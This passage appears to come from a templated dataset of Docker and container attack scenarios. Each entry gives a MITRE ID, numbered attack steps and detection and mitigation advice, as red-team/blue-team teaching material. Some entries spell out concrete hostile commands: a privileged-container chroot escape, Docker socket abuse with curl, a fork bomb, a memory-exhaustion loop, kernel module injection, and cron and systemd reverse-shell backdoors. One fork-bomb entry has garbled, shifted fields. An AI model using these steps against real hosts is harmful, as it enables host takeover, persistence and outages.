- **Attack Steps**: 1. Red Team mounts /proc/sys into a container with --privileged.2. They use sysctl -w kernel.core_pattern=/tmp/malware to hijack crash dumps or log files.3. They may modify net.ipv4.ip_forward or kernel security flags to weaken host protection.4. This bypasses AppArmor or seccomp if misconfigured.5. Kernel crash dumps may execute arbitrary scripts or be written to world-writable areas.6. Blue Team doesn’t detect because sysctl access looks normal from container logs.7. Defense includes blocking /proc/sys mounts and using immutable kernel configs.8. Enforce syscall filtering to deny sysctl calls.9. Lock down kernel namespace exposure completely.10. Use tools like kube-bench to enforce CIS Docker benchmarks.
- **Detection**: Sysctl logs, Falco rules
- **Solution**: No kernel path exposure to containers
- **Tags**: #kernelconfig #procabuse #dockerescape

## Exploit Docker BuildKit Sidecar to Inject Host Payload

- **Attack Type**: BuildKit Misuse
- **Target**: CI/CD Host
- **Vulnerability**: Insecure bind mount in BuildKit
- **MITRE**: T1609
- **Impact**: Backdoor installation via Docker build phase
- **Tools**: Docker BuildKit, Bash
- **Scenario**: Attacker abuses BuildKit sidecars to mount host paths and drop malicious payloads
- **Attack Steps**: 1. Red Teamer targets a CI/CD setup using BuildKit for building containers.2. They inject malicious commands into a Dockerfile (e.g., RUN --mount=type=bind,src=/etc,dst=/mnt).3. BuildKit mounts host’s /etc during build phase.4. Attacker writes back to /mnt/cron.d/malicious_job, which schedules root tasks on host.5. Since build container runs with host privileges or mounts, payload survives post-build.6. Blue Team doesn’t monitor build containers in CI pipelines.7. Defense: restrict bind mounts during build with buildkitd.toml policy.8. Validate Dockerfile instructions strictly.9. Red Team shows how BuildKit builds can become backdoor installation points.10. DevSecOps should audit build phase mounts and disable host write access.
- **Detection**: Dockerfile audit, CI/CD mount logging
- **Solution**: Restrict bind mounts, use read-only volumes
- **Tags**: #buildkit #dockerbuild #cicdescape

## Container Writes to Host Logs via Journald Socket Abuse

- **Attack Type**: journald Socket Abuse
- **Target**: Host Logging
- **Vulnerability**: journald socket writable from container
- **MITRE**: T1565.002
- **Impact**: Log poisoning, forensic tampering
- **Tools**: systemd-journald, netcat, Docker
- **Scenario**: Attacker inside container abuses journald socket to write fake host logs
- **Attack Steps**: 1. Host mounts journald UNIX socket into container (e.g., /run/systemd/journal/socket).2. Attacker writes custom binary logs into socket using journald protocol.3. These logs appear as legitimate host messages in journalctl, masking real activity or injecting fake entries.4. This can poison forensic logs or trigger false alerts.5. Blue Team fails to correlate tampering if log source is unauthenticated.6. Defense includes isolating journald socket from containers, using syslog-forwarding with identity enforcement.7. AppArmor can prevent socket communication.8. Red Team demonstrates log poisoning as stealth defense evasion technique.9. Validate logs by hostname + cgroup correlation.10. Avoid journald socket exposure in container runtime.
- **Detection**: Compare log source cgroup, journald audit trail
- **Solution**: Isolate journald socket from containers
- **Tags**: #journald #logtamper #dockerabuse

## Docker Escape by Overriding /etc/resolv.conf

- **Attack Type**: DNS Hijacking
- **Target**: Host OS
- **Vulnerability**: Writable bind mount of /etc
- **MITRE**: T1565.001
- **Impact**: Silent DNS redirection and data theft
- **Tools**: Docker, Bash, dnsmasq
- **Scenario**: Container rewrites /etc/resolv.conf on host to reroute all DNS queries
- **Attack Steps**: 1. Attacker launches container with /etc bind-mounted from host.2. They modify /etc/resolv.conf to point to an attacker-controlled DNS server.3. This reroutes host DNS traffic silently to attacker’s infrastructure.4. Host software resolves domains through compromised DNS, allowing MITM or data exfiltration.5. If container is used in build or runtime context, it can also poison CI/CD tools.6. Blue Team fails to detect unless DNS logs are centrally monitored.7. Red Team uses this to simulate DNS redirection attack in Docker environments.8. Defend by never binding system paths like /etc into containers.9. Monitor for DNS configuration drift across systems.10. Validate DNS servers and resolve integrity via DNSSEC.
- **Detection**: DNS query logs, resolv.conf diff checks
- **Solution**: No /etc mounts in containers
- **Tags**: #dnspoison #dockerescape #dnssecurity

## Container Escapes via CVE-2021-3156 (sudoedit Heap Overflow)

- **Attack Type**: Host Binary Exploitation
- **Target**: Host OS / Container
- **Vulnerability**: Vulnerable sudo in shared environments
- **MITRE**: T1068
- **Impact**: Privilege escalation to host root
- **Tools**: Exploit DB, Bash, sudoedit
- **Scenario**: Exploit sudo vulnerability inside container to break isolation and gain root on host in misconfigured environments
- **Attack Steps**: 1. Red Team deploys a container that has the sudo binary installed (common in Ubuntu-based containers).2. They identify the version is vulnerable to CVE-2021-3156 (heap-based buffer overflow in sudoedit).3. Inside the container, attacker compiles and runs a public exploit targeting the vulnerable sudo binary.4. In certain misconfigured environments (like where / is mounted or with privileged containers), the attacker is able to break out of the container namespace and gain root access on the host.5. The exploit overwrites heap memory and allows execution of arbitrary commands as root.6. If host shares kernel or binary paths, even partial overwrites may affect host process behavior.7. Blue Team may miss this if container logs aren't being monitored or if EDR isn't container-aware.8. Mitigation includes removing unnecessary binaries like sudo from base images and using minimal containers.9. Containers should be run in non-privileged, read-only file systems where possible.10. Alerting should be configured for unusual binary usage inside containers.
- **Detection**: Runtime container logging, sudo binary tracing
- **Solution**: Use minimal base images; patch sudo; apply AppArmor/SELinux
- **Tags**: #sudoexploit #CVE20213156 #containerescape

## Breakout via Misconfigured /sys/fs/cgroup Mount

- **Attack Type**: Cgroup Manipulation
- **Target**: Host Kernel / Process Mgmt
- **Vulnerability**: Writable /sys/fs/cgroup mount
- **MITRE**: T1496
- **Impact**: Host service disruption, container breakout
- **Tools**: Bash, echo, /sys/fs/cgroup
- **Scenario**: Container modifies control group settings to affect host resource limits and services
- **Attack Steps**: 1. Red Teamer targets a container with /sys/fs/cgroup mounted as writable (some legacy containers do this for metrics or tuning).2. They navigate to /sys/fs/cgroup paths and begin injecting configuration entries such as memory or CPU limits affecting host services.3. For instance, attacker echoes high CPU weight to PID cgroups of host processes.4. This results in throttling or starving key host services like docker, systemd, etc.5. In worst cases, attacker deletes .mount or .slice files causing process disruption or reboot.6. Cgroup v1 systems are more susceptible due to lack of fine-grained permissions.7. Blue Team may not detect this unless cgroup event monitoring is enabled.8. Countermeasures include using read-only cgroup mounts and transitioning to cgroup v2 with stricter delegation.9. Containers should not require direct access to /sys/fs/cgroup; metrics should be exported instead.10. Tools like Falco can detect changes in sensitive cgroup paths in real time.
- **Detection**: Sysfs monitoring, container runtime policy check
- **Solution**: Mount /sys/fs/cgroup as read-only; use eBPF for enforcement
- **Tags**: #cgroupabuse #dockerescape #hostcontrol

## Abusing Docker Volume Plugin to Mount Host Filesystems

- **Attack Type**: Volume Plugin Injection
- **Target**: Host Filesystem
- **Vulnerability**: Malicious volume plugin registration
- **MITRE**: T1200
- **Impact**: Full host file system exposure
- **Tools**: Docker CLI, Custom Plugin, Go
- **Scenario**: Exploit Docker volume plugins (e.g., local, nfs, rclone) to mount and access host or remote FS
- **Attack Steps**: 1. Red Team exploits a Docker daemon configured to accept external volume plugins.2. They register a malicious volume plugin (written in Go) which simulates a valid driver but actually mounts /etc, /root, or any path of interest.3. Attacker runs docker run -v attacker_plugin:/data and accesses host filesystem transparently.4. They read/write sensitive host files like /etc/shadow, ~/.ssh/id_rsa etc.5. Developers often install volume plugins without security auditing, especially in CI/CD.6. Blue Team visibility is low because plugin mounts are treated as legitimate.7. Plugin logs are rarely monitored and operate over REST sockets.8. Defenders should disallow untrusted plugin installations and use allowlists.9. Use namespace isolation for plugins and restrict paths they can mount.10. Runtime audits should monitor which plugins are called during builds or runtime.
- **Detection**: Docker plugin logs, volume audit
- **Solution**: Use trusted plugins only, disable plugin auto-discovery
- **Tags**: #volumeplugin #filesystemabuse #dockerattack

## CVE-2021-41091 Container Escape via OverlayFS Privilege Escalation

- **Attack Type**: OverlayFS Escape
- **Target**: Linux Host FS
- **Vulnerability**: CVE-2021-41091 in OverlayFS
- **MITRE**: T1068
- **Impact**: Host file system override from container
- **Tools**: Exploit Code, Bash
- **Scenario**: Exploit OverlayFS vulnerability to access host filesystem from container
- **Attack Steps**: 1. Red Team targets a Linux host with Docker that uses OverlayFS for union file systems.2. They run a container on a vulnerable kernel (<5.13.19) where CVE-2021-41091 exists.3. Within the container, they create a malformed OverlayFS mount and exploit it to gain write access outside container scope.4. The exploit bypasses copy-up protections and allows attacker to override files in the lower layer (host).5. They inject code or change configurations in /etc, /bin, etc.6. This results in persistent host compromise once the container is restarted or exited.7. Blue Team may miss this because it involves normal filesystem operations.8. Mitigation includes updating kernel versions and disabling untrusted container image execution.9. Audit OverlayFS usage during builds and sandbox mounts.10. AppArmor profiles can block filesystem escape by enforcing read-only file system or denying new mount syscalls.
- **Detection**: Kernel version check, mount log review
- **Solution**: Patch kernel, use read-only mount strategies
- **Tags**: #CVE202141091 #overlayfs #dockerescape

## Docker Breakout via Mounted Host /dev/kmsg

- **Attack Type**: Kernel Log Injection
- **Target**: Host Logging / Syslog
- **Vulnerability**: Mounted /dev/kmsg from host
- **MITRE**: T1565.002
- **Impact**: Fake kernel messages, alert evasion
- **Tools**: Docker, Bash, echo
- **Scenario**: Attacker writes fake logs or injects commands into kernel log buffer
- **Attack Steps**: 1. Attacker runs a container with /dev/kmsg mounted (host kernel log interface).2. They use echo to write to /dev/kmsg, simulating legitimate system messages or injecting commands that appear in syslog.3. On some systems, rsyslog reads kernel messages and may execute or alert on certain patterns.4. Attacker can simulate kernel panics, disk failures, or even create confusion during incident response.5. Some audit systems may even parse and forward kmsg content without verification.6. This is used for log poisoning, log hiding, or forensic tampering.7. Mitigation: never mount /dev/kmsg into containers.8. Blue Team can detect unusual kmsg entries using journalctl -k filters or regex-based SIEM alerts.9. Red Team uses this as a stealth method to obfuscate activity.10. AppArmor and Seccomp should deny write access to /dev/kmsg entirely.
- **Detection**: Kmsg logs, syslog diff analysis
- **Solution**: Avoid mounting /dev/kmsg; sanitize log inputs
- **Tags**: #kmsgabuse #kernelspoof #dockerabuse

## Leaking Host Secrets via Mounted .dockerenv File

- **Attack Type**: Environment Variable Abuse
- **Target**: CI/CD Hosts / Containers
- **Vulnerability**: Environment variable leak paths
- **MITRE**: T1552.001
- **Impact**: Secret exfiltration via ENV abuse
- **Tools**: Bash, Python
- **Scenario**: .dockerenv used to detect container environment and adapt malicious behavior
- **Attack Steps**: 1. Red Teamer mounts host / or /etc and discovers the .dockerenv file (always exists inside containers).2. They use it to fingerprint if environment is containerized and decide to behave stealthily or exfiltrate data.3. Additionally, by accessing the host's /proc/1/environ or /etc/hostname, they extract sensitive environment variables.4. These may contain CI/CD tokens, AWS credentials, or DB passwords.5. This is particularly dangerous in container-based builds using self-hosted runners.6. Blue Team often overlooks variable leaks via /proc or /etc.7. Defenders must isolate secrets using vaults and never expose credentials as ENV vars.8. Use minimal Dockerfiles and avoid baking secrets into container layers.9. Monitoring tools should flag environment variable access in containers.10. Red Team shows how ENV abuse leads to stealthy data exfil.
- **Detection**: Container logs, ENV var scanning
- **Solution**: Inject secrets at runtime, block ENV exposure
- **Tags**: #envleak #dockersecrets #containersecurity

## Exploit via docker cp Race Condition

- **Attack Type**: File Extraction Abuse
- **Target**: Host Filesystem
- **Vulnerability**: Docker cp symlink resolution bug
- **MITRE**: T1212
- **Impact**: Read access to arbitrary host files
- **Tools**: Docker CLI, Bash
- **Scenario**: Race condition in docker cp allows host file access from container context
- **Attack Steps**: 1. Red Team identifies a legacy Docker version where a race condition in docker cp allows container to escape filesystem confinement.2. They trick the docker cp command to resolve symbolic links to host paths.3. During copy operation, they replace in-container files with symlinks to host-sensitive files like /etc/shadow.4. When Docker engine completes the cp operation, host files are copied to the attacker's local system.5. This leads to read-access to arbitrary host files.6. Blue Team often considers docker cp safe and doesn’t monitor its behavior.7. Defense includes upgrading Docker version, avoiding copy from writable containers, and enforcing symlink resolution limits.8. Runtime policies should disallow docker cp for running containers in production.9. Red Team uses this to simulate exfil of developer .env or credential stores.10. Audit container file access via overlay audit or eBPF hooks.
- **Detection**: Docker debug logs, syscall trace
- **Solution**: Patch Docker, disallow interactive copy operations
- **Tags**: #dockercp #filesystemleak #dockerexploit

## Container Escapes by Manipulating Host’s LSM Profile

- **Attack Type**: LSM Bypass
- **Target**: Host OS Security
- **Vulnerability**: AppArmor or SELinux disabled in container
- **MITRE**: T1562.001
- **Impact**: Full container sandbox disable
- **Tools**: Bash, aa-disable, setenforce
- **Scenario**: Attacker alters AppArmor/SELinux profiles from container in misconfigured environments
- **Attack Steps**: 1. Red Teamer identifies containers with access to LSM (Linux Security Modules) configuration tools.2. They run commands like aa-disable, setenforce 0 inside container or mounted volumes.3. If host LSM is not enforced or Docker is started with --security-opt=unconfined, attacker disables host protections.4. They then run exploits that would otherwise be blocked by AppArmor or SELinux.5. Blue Team misses this because security policy enforcement isn’t logged or audited.6. Defense includes enforcing LSM profiles for every container via docker run --security-opt.7. Also log all LSM status changes using auditd or journald.8. Never run containers with unconfined profiles in production.9. Use Falco rules to monitor syscall access violations.10. Red Team uses this to simulate hardened environment bypass.
- **Detection**: LSM status logs, auditd records
- **Solution**: Enforce LSM on container startup, deny override tools
- **Tags**: #apparmorbypass #selinux #lsmattack

## Backdoor Host by Planting SystemD Service from Container

- **Attack Type**: Persistence via Service Injection
- **Target**: Host Init System
- **Vulnerability**: Writable mount to /etc/systemd/
- **MITRE**: T1543.002
- **Impact**: Host-level root persistence
- **Tools**: Bash, systemctl, nano
- **Scenario**: Attacker writes malicious .service file on host via mounted path
- **Attack Steps**: 1. Attacker runs container with bind mount to host’s /etc/systemd/system/.2. They create docker-backdoor.service that executes a reverse shell at boot.3. This file is saved on host and registered as a legit service.4. On next boot (or if daemon is reloaded), backdoor runs as root.5. Blue Team may miss it as the .service file looks legitimate.6. Defense: disallow bind mounts to system paths like /etc.7. Audit new .service file creation and systemd reload events.8. Use File Integrity Monitoring to detect unauthorized service changes.9. Never run CI/CD containers with access to systemd folders.10. Red Team shows how containers can become persistence launchpads.
- **Detection**: Systemd logs, FIM solutions
- **Solution**: Disallow mount to system folders; audit service creation
- **Tags**: #systemdpersist #dockerabuse #hostbackdoor

## Docker Escape via cap_sys_admin Misuse

- **Attack Type**: Capability Abuse
- **Target**: Linux Host
- **Vulnerability**: Over-permissive container capabilities
- **MITRE**: T1609
- **Impact**: Host takeover via capability abuse
- **Tools**: Docker CLI, Bash
- **Scenario**: Container granted CAP_SYS_ADMIN allows mounting, pivoting, and escaping
- **Attack Steps**: 1. Red Team identifies container running with --cap-add=SYS_ADMIN (very common in complex CI/CD jobs).2. Inside the container, they use mount --bind and pivot_root to remount host filesystem and change root directory.3. They chroot into host environment and execute commands outside container sandbox.4. Since CAP_SYS_ADMIN allows direct kernel interactions, attacker essentially gains root.5. This is equivalent to running a privileged container but often overlooked.6. Blue Team often whitelists SYS_ADMIN for build performance, unaware of implications.7. Defense: never use CAP_SYS_ADMIN unless absolutely required.8. Use container security profiles to strip all unnecessary capabilities.9. Audit container configs and monitor for pivot_root, mount syscalls.10. Red Team uses this to simulate “capability creep” from dev to prod.
- **Detection**: Syscall monitoring, audit logs
- **Solution**: Restrict capabilities using Docker security profiles
- **Tags**: #capabilities #sysadminabuse #dockerescape

## Kernel Module Injection from Privileged Container

- **Attack Type**: Kernel-Level Exploitation
- **Target**: Host Kernel
- **Vulnerability**: Privileged container with module loading
- **MITRE**: T1068
- **Impact**: Full host compromise via malicious kernel driver
- **Tools**: insmod, modprobe, Custom Kernel Module (LKM)
- **Scenario**: Load malicious kernel module from inside a privileged container to gain control of the host
- **Attack Steps**: 1. Red Team starts a Docker container using --privileged flag, which gives it almost unrestricted access to the host.2. Inside the container, they compile or transfer a pre-built malicious Linux Kernel Module (LKM) designed to provide a reverse shell or hide files.3. They run insmod lkm_backdoor.ko or modprobe to inject the kernel module.4. Since the container is privileged, and modules are loaded into the shared kernel, this affects the entire host system.5. The module can now create backdoors, hide processes, or escalate privileges.6. This is highly stealthy and not detected by container-level monitoring alone.7. Blue Team may miss this unless the host is equipped with kernel integrity monitoring tools.8. Defenders should prohibit the use of privileged containers in production and disable module loading on hardened systems.9. Use AppArmor/SELinux policies to restrict use of insmod or access to /lib/modules.10. Runtime detection tools like Kernel Integrity Checkers (e.g., LKRG) can alert on such behavior.
- **Detection**: Kernel logs, integrity verification, syscall audit
- **Solution**: Disable privileged containers, audit kernel module loading
- **Tags**: #kernelmodule #lkm #privilegedcontainer

## Hijacking Docker UNIX Socket to Control Host

- **Attack Type**: API Socket Abuse
- **Target**: Docker Daemon
- **Vulnerability**: Mounted Docker socket in container
- **MITRE**: T1525
- **Impact**: Full host control via Docker API
- **Tools**: curl, Docker API, /var/run/docker.sock
- **Scenario**: Attacker inside container accesses Docker UNIX socket to control host’s Docker daemon
- **Attack Steps**: 1. Red Teamer targets a container that has access to the Docker UNIX socket (/var/run/docker.sock).2. Inside the container, they use tools like curl --unix-socket or Docker CLI to query the Docker API directly.3. They run curl --unix-socket /var/run/docker.sock http:/v1.40/containers/json to list all running containers.4. Then they use the same API to spin up new containers with mounted host volumes (e.g., /etc, /root) or privileged access.5. This effectively allows attacker to break out of the container by spawning a host-level privileged container.6. The host Docker daemon blindly trusts requests from the socket, making this a powerful attack vector.7. Defenders often mistakenly bind this socket into containers for build automation, not realizing its risk.8. Monitoring access to /var/run/docker.sock is critical.9. Use role-based access control (RBAC) and least privilege to protect Docker group users.10. Never bind the Docker socket unless behind a strict gateway or proxy with logging.
- **Detection**: Docker daemon logs, API call tracing
- **Solution**: Avoid mounting Docker socket into containers; restrict access
- **Tags**: #dockersock #dockerapi #containerescape

## Docker Container Escape via Misused --device Flag

- **Attack Type**: Device Access Exploit
- **Target**: Host Hardware / Devices
- **Vulnerability**: Raw device access inside container
- **MITRE**: T1200
- **Impact**: Physical damage or memory tampering
- **Tools**: Docker CLI, Custom Binary
- **Scenario**: Container runs with raw device access allowing direct interaction with host hardware
- **Attack Steps**: 1. Red Team launches a container with access to host devices using --device /dev/mem or --device /dev/kmsg.2. They execute custom code inside the container that writes to memory-mapped devices.3. For example, writing to /dev/mem may allow dumping of kernel memory if protections are not enforced.4. Similarly, writing to /dev/sda can allow overwriting disk blocks.5. With access to physical devices, the attacker can even trigger reboot or modify GRUB config.6. This is often overlooked in containers that need device access for GPU or serial interfaces.7. Blue Team may not detect this unless auditd is configured to watch device nodes.8. Use of AppArmor/Seccomp can restrict mknod, open, and write syscalls to sensitive devices.9. Run containers in a sandbox or VM when they need physical device access.10. Red Team uses this to simulate insider threats or rogue hardware control within CI builds.
- **Detection**: Auditd device monitoring, syscall logging
- **Solution**: Do not allow raw device access to containers unless isolated
- **Tags**: #devicemount #dockerdevice #containerescape

## Escaping via Malicious Cron Job from Mounted Host Volume

- **Attack Type**: Persistence Abuse
- **Target**: Host OS
- **Vulnerability**: Writable cron folder from container
- **MITRE**: T1053.003
- **Impact**: Root-level scheduled code execution
- **Tools**: Bash, Crontab
- **Scenario**: Attacker writes cronjob to host’s /etc/cron.d via shared mount
- **Attack Steps**: 1. Red Teamer runs a container with a bind mount to /etc/cron.d or /etc.2. They create a new file inside /etc/cron.d/reverse_shell that runs a reverse shell every 10 minutes.3. The file is owned by root and follows correct syntax so it's executed by cron daemon.4. This job runs outside the container context but was created from inside.5. On many dev systems or CI agents, these mounts exist for config syncing.6. Blue Team does not monitor cron config changes inside containers.7. Defenders must restrict container access to config folders like /etc, /var/spool/cron.8. File integrity monitoring can detect unauthorized cron file creation.9. Red Team leverages this for long-term persistence post-build.10. Mitigation: mount system config folders as read-only or not at all.
- **Detection**: Cron logs, FIM alerts, system audit logs
- **Solution**: Prevent container access to /etc/cron.d; enforce read-only mounts
- **Tags**: #cronescape #dockermount #hostpersistence

## Breaking Isolation via Insecure Custom Runtimes

- **Attack Type**: Custom Runtime Abuse
- **Target**: Host OS via runtime
- **Vulnerability**: Unhardened or buggy custom runtimes
- **MITRE**: T1649
- **Impact**: Full container breakout using runtime weakness
- **Tools**: Custom OCI Runtimes, Bash
- **Scenario**: Use a vulnerable custom runtime (e.g., runj, gvisor) to bypass container boundaries
- **Attack Steps**: 1. Red Team identifies that Docker or Kubernetes is configured to use a custom runtime (runj, crun, gvisor) for some containers.2. They deploy a malicious container that exploits known bugs or config errors in that runtime.3. For example, they inject malformed config.json to exploit deserialization or path traversal.4. If the runtime executes hooks with elevated privileges (e.g., prestart or poststop), attacker gains access to host resources.5. They escape the container and run processes in host namespaces.6. Custom runtimes may lack hardened syscall filtering or sandboxing.7. Blue Team often trusts third-party runtimes without formal testing.8. Defenders must restrict runtime usage to vetted tools, enforce AppArmor/Seccomp regardless of runtime.9. Monitor unusual runtime behavior in container lifecycle logs.10. Red Team leverages this to simulate new threat surfaces beyond runc.
- **Detection**: OCI logs, container lifecycle events
- **Solution**: Use only trusted runtimes; validate configs strictly
- **Tags**: #customruntime #dockerescape #ociabuse

## Log File Poisoning via Shared Syslog Mount

- **Attack Type**: Log Injection
- **Target**: Host Logging System
- **Vulnerability**: Mounted log folder writable
- **MITRE**: T1565.002
- **Impact**: Forensic disruption, log forgery
- **Tools**: Bash, Echo, Syslog Format
- **Scenario**: Inject fake logs into host log files using mounted syslog directories
- **Attack Steps**: 1. Attacker launches a container with mount to /var/log/ or /var/log/syslog.2. They create or append log entries that simulate system errors, login failures, or sudo attempts.3. These fake logs can mislead incident response or mask real activity.4. On reboot, analyst sees tampered log history.5. Attacker may inject logs that simulate false positives to overwhelm alert systems.6. Defenders often ignore write access to logging directories.7. Use File Integrity Monitoring on log folders and disallow container mounts to logs.8. Audit container write activity to critical paths.9. Log systems like journald should be isolated from container file writes.10. Red Team uses this for denial-of-analysis and forensic confusion.
- **Detection**: Compare logs with FIM snapshots, alert on log overwrite
- **Solution**: Block log folder mounting into containers
- **Tags**: #logpoisoning #syslog #dockersecurity

## Escape via Privileged Re-Mounting of Host Root

- **Attack Type**: Filesystem Pivot Attack
- **Target**: Host Filesystem
- **Vulnerability**: Privileged container with mount access
- **MITRE**: T1609
- **Impact**: Full host takeover via chroot
- **Tools**: Docker with --privileged, mount, chroot
- **Scenario**: Use mount in privileged container to remount host / and gain control
- **Attack Steps**: 1. Red Team runs a container with --privileged flag.2. Inside container, they execute: a. mkdir /mnt/host b. mount --bind / /mnt/host c. chroot /mnt/host3. Now they operate in host root context, executing any binary, reading/writing to system files.4. No container restriction applies in this context; attacker now has full root access.5. Defenders who don't audit container capabilities may miss this entirely.6. AppArmor or Seccomp cannot stop this in privileged mode.7. Never use privileged containers in production.8. Audit container launches for use of --privileged or --cap-add=ALL.9. Use GKE, EKS security policies to block such configurations.10. Red Team leverages this to simulate root access via lazy mount.
- **Detection**: Runtime process monitoring, mount audit logs
- **Solution**: Never allow --privileged; use policy enforcers
- **Tags**: #pivotroot #dockermount #chrootabuse

## Disabling AppArmor Profile Inside Container

- **Attack Type**: Sandbox Disable
- **Target**: Host Security Profile
- **Vulnerability**: AppArmor profile modifiable from container
- **MITRE**: T1562.001
- **Impact**: Escape from container sandbox controls
- **Tools**: Bash, aa-complain, aa-disable
- **Scenario**: Attacker modifies or disables AppArmor profile from container
- **Attack Steps**: 1. Red Teamer identifies that the container has access to AppArmor tools.2. They run aa-complain or aa-disable against their own container profile.3. If host policy allows this (via bind mount or poor configuration), the container can disable restrictions.4. They then exploit other syscalls like ptrace, mmap, or load kernel modules.5. Sandbox protections are removed, effectively making the container equivalent to host shell.6. Blue Team misses this if AppArmor logging is not configured.7. Ensure containers do not have access to aa-* binaries.8. Enforce AppArmor profiles on host startup with immutable flags.9. Use apparmor_parser in strict mode.10. Red Team uses this as a step toward kernel-space exploit delivery.
- **Detection**: AppArmor logs, syscall usage anomaly
- **Solution**: Prevent containers from accessing AppArmor utilities
- **Tags**: #apparmor #sandboxbypass #dockersecurity

## Exploiting Capabilities Leaked from SetUID Binaries

- **Attack Type**: SUID Binary Abuse
- **Target**: Host OS via container
- **Vulnerability**: SetUID binaries left inside image
- **MITRE**: T1548.001
- **Impact**: Container privilege escalation to root
- **Tools**: Bash, SUID Finder, perl, nmap, vim
- **Scenario**: Use SetUID binaries in container to escalate to root and escape
- **Attack Steps**: 1. Red Team searches for SetUID binaries in the container using find / -perm -4000.2. They identify tools like nmap, vim, or custom scripts left behind by developers.3. Using known techniques (!bash inside vim, interactive mode in nmap), they gain root shell.4. If container is running in privileged mode or with mounted host volumes, they can now access host.5. These SetUID binaries should never exist in containers unless absolutely required.6. Blue Team may overlook these during base image scanning.7. Shift-left security includes removing all SetUID binaries from images.8. Use static analysis and container hardening tools like Trivy or Dockle.9. Runtime monitoring for execution of high-risk binaries is crucial.10. Red Team uses this to demonstrate root-to-host traversal via image misconfig.
- **Detection**: Execution logs, SUID binary audit
- **Solution**: Remove SetUID binaries from base images
- **Tags**: #setuid #imagehardening #dockersecurity

## Abuse of Host Network Stack in --network host Mode

- **Attack Type**: Network Access Bypass
- **Target**: Host Network
- **Vulnerability**: Use of --network host in container
- **MITRE**: T1040
- **Impact**: Host traffic sniffing, lateral movement
- **Tools**: Docker CLI, Nmap, Tcpdump
- **Scenario**: Container gains access to host network stack directly, bypassing isolation
- **Attack Steps**: 1. Red Team runs container with --network host to simulate builds that require low-latency access.2. Inside the container, they run tools like nmap or tcpdump and observe live traffic on host interfaces.3. They detect other services, sniff credentials, or manipulate firewall rules.4. Using iptables, they may even redirect traffic from one container to another.5. Blue Team fails to isolate containers from host networking layer.6. Best practice: avoid --network host unless absolutely necessary.7. Use CNI plugins to provide isolated bridges or overlay networks.8. Monitor docker inspect output for host network usage.9. Red Team simulates insider sniffing or container-to-host pivot attacks.10. Firewall and IDS should treat host-networked containers as untrusted peers.
- **Detection**: Packet logs, network interface monitoring
- **Solution**: Avoid --network host; use CNI for isolation
- **Tags**: #hostnetwork #sniffing #dockersecurity

## Resource Starvation via Fork Bomb in Unrestricted Container

- **Attack Type**: No Resource Limits - CPU DoS
- **Target**: :& };:which recursively spawns child processes.<br>4. Due to lack of CPU restrictions, this causes the container to consume 100% of the host CPU cycles.<br>5. Other containers or host services (e.g., web servers, monitoring agents) become unresponsive.<br>6. Blue Team investigates and finds no rate-limiting or kernel cgroup-based constraints.<br>7. Even if the attacker’s container is terminated, host may require a reboot due to complete system hang.<br>8. Resource exhaustion like this is trivial to execute but dangerous in multitenant CI/CD platforms.<br>9. Sysadmins should always defineresources.limits.cpuandresources.limits.memoryin Kubernetes or--memory/--cpus` flags in Docker.10. Monitoring tools should alert if CPU/memory usage spikes abnormally beyond defined baselines.
- **Vulnerability**: CI/CD Node / Docker Host
- **MITRE**: Missing CPU & memory constraints
- **Impact**: T1499.001
- **Tools**: Bash, Docker CLI
- **Scenario**: Attacker triggers a fork bomb in a container with no CPU/memory limits, choking the host system
- **Attack Steps**: 1. Attacker gains access to a container running in a shared environment (e.g., Kubernetes pod, CI/CD job runner).2. The container was launched without specifying any --memory or --cpus limits.3. Inside the container, attacker runs a classic fork bomb: `:(){ :
- **Detection**: Denial of Service for all users on the host
- **Solution**: System metrics (Prometheus, Sysdig), process count
- **Tags**: Always enforce cgroup limits per container

## Memory Leak Attack on Container Without Memory Limits

- **Attack Type**: Memory Abuse - DoS
- **Target**: Docker Host
- **Vulnerability**: Lack of memory boundaries
- **MITRE**: T1499.003
- **Impact**: Host OOM, kills legit containers
- **Tools**: Python, Stress-ng
- **Scenario**: Continuously allocates memory in container without --memory limit, causing host OOM kill
- **Attack Steps**: 1. Red Team deploys a container intentionally without a memory cap (--memory or mem_limit in Compose is omitted).2. Inside the container, they run a Python script allocating memory in an infinite loop: a = []; while True: a.append('A' * 10**6).3. Over time, the container consumes all available RAM on the host.4. Kernel’s OOM (Out-Of-Memory) Killer is triggered and may kill critical processes to reclaim memory.5. Sometimes, even system processes like sshd or dockerd are terminated.6. The attacker doesn’t need root privileges to execute this; basic script access suffices.7. Blue Team might not see anything in the container logs unless host monitoring is enabled.8. Monitoring RAM usage per container is crucial to detect such misuse early.9. Prevent by enforcing strict memory limits (--memory, Kubernetes limits.memory) during deployment.10. OOM alerts via CloudWatch, Sysdig, or Datadog help correlate root cause and improve visibility.
- **Detection**: Host OOM logs, memory usage anomalies
- **Solution**: Apply memory limits to all workloads
- **Tags**: #oom #memoryleak #nodockerlimit

## Image Pull from Untrusted Source with Embedded Crypto Miner

- **Attack Type**: Insecure Image Sources
- **Target**: CI/CD Runners
- **Vulnerability**: Public images with hidden malware
- **MITRE**: T1203
- **Impact**: Crypto mining + high CPU load
- **Tools**: DockerHub, Docker CLI, top, strace
- **Scenario**: Pull public image from DockerHub that contains hidden crypto miner
- **Attack Steps**: 1. Developer pulls an image from DockerHub using docker pull randomuser/nginx:latest, assuming it’s safe.2. Image was published by an attacker using a legitimate-sounding name and contains a hidden crypto miner.3. After launching the container, a background process starts silently mining cryptocurrency using xmrig or cpuminer.4. The miner runs with low CPU priority, so it doesn’t get noticed in regular usage.5. Blue Team only detects unusual CPU usage days later using metrics dashboards.6. Root cause traced to image contents, which were never scanned or verified.7. Always validate image origin via signatures (Docker Content Trust or Cosign).8. Use Trivy, Clair, or Grype to scan for known malware and background processes.9. Enterprises should maintain a private registry or mirror and control access.10. Never use :latest tag from public registries in production pipelines.
- **Detection**: CPU usage metrics, image static scan
- **Solution**: Enforce trusted image sources, use scanning tools
- **Tags**: #dockerhub #cryptominer #imageabuse

## Exploiting Hardcoded AWS Keys in Docker Image Layer

- **Attack Type**: Secrets Exposure
- **Target**: Public Docker Image
- **Vulnerability**: Secrets baked into image layer
- **MITRE**: T1552.001
- **Impact**: Full AWS access from image secrets
- **Tools**: Trivy, Docker CLI, AWS CLI
- **Scenario**: Scan public image to retrieve .aws/credentials file from earlier layer
